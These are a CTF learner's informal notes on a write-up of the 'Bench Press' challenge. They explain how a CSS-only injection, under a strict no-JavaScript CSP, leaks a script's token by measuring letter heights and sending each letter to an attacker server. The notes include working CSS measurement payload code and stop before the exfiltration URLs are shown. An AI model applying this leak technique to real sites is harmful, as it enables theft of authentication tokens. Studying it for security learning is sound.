## Bench Press
https://blog.pspaul.de/posts/bench-press-leaking-text-nodes-with-css/

Honestly the writeup went over my head. But css injection isnt something iv seen before so ill try to explain what i gained and then write about what i got to know about this injection.

- Concept : Leaking Text Nodes with CSS
  ```
  a text node is the actual text content of an element, but CSS can’t select it independently. Instead, CSS styles can be applied to the parent element to affect its appearance
  ```
- Goal: To get the authentication token below and only possible injection was the theme parameter which was inside the style tag
```
<!DOCTYPE html>
<html>
<head>
  <!-- ... -->
  <script nonce="...">t="01b275146755aac26d5b2c7821b7c3"</script>
<!-- ... -->
```

- The csp
 ```
style-src 'unsafe-inline'
we’re big fans of inline styles here
img-src http: https:
remote images are welcome too
frame-ancestors 'none'
no framing
base-uri 'none'
no <base>
form-action 'self'
no weird forms
default-src 'none'
no other stuff (read: no JS)
sandbox allow-forms
really, really no JS (missing allow-scripts)
```
Techniques that leak the charset of a text node that would fit our conditions:

- Using default fonts to cause size differences
- Using default fonts to cause timing differences. Timing side-channels are generally slower and less reliable, so let’s go with the size differences

### Steps used
- Make the text element have 1 char per line
- Configure letters to have unique heights
- Iteratively remove/hide more and more characters from the text
- Calculate the height difference between two steps to find which character was removed
- Exfiltrate the letter to our attacker server

### Payload construction
- How to  measure the height/width of any HTML element and get the size as a number in a CSS variable
```
  @property --y {
  syntax: "<number>";
  initial-value: 0; 
  inherits: true;
}
@property --h {
  syntax: "<integer>";
  initial-value: 0; 
  inherits: true;
}
@keyframes y {
  to { --y: 1 }
}
script { /* the element we want to leak from */
  overflow: auto;
  position: relative;
  &:before {
    content: '';
    position: absolute;
    left: 0;
    top: 0;
    height: 1px;
    view-timeline: --cy block;
  }

  animation: y linear;
  timeline-scope: --cy;
  animation-timeline: --cy;
  animation-range: entry 100% exit 100%;

  /* --h now contains the element's pixel height as a number */
  --h: calc(1/(1 - var(--y)));
}
  ```
 
- Exfiltrating the Letters
  
The height difference that corresponds to the individual height of a letter is stored as a number, so how can we send it to our server? Paused animations. 
```
When the height difference (corresponding to the height of a single letter) is stored as a number in CSS, it becomes challenging to send this data directly to a server because CSS properties alone do not support direct network requests or data transmission. CSS is inherently limited to styling and layout purposes and cannot interact directly with external resources like servers.

Paused animations can be useful in CSS and JavaScript when you want to stop or control the timing of animations on the page
```
By changing the delay of a paused animation, we can select different values. We use it to select an exfiltration URL that matches the right letter:

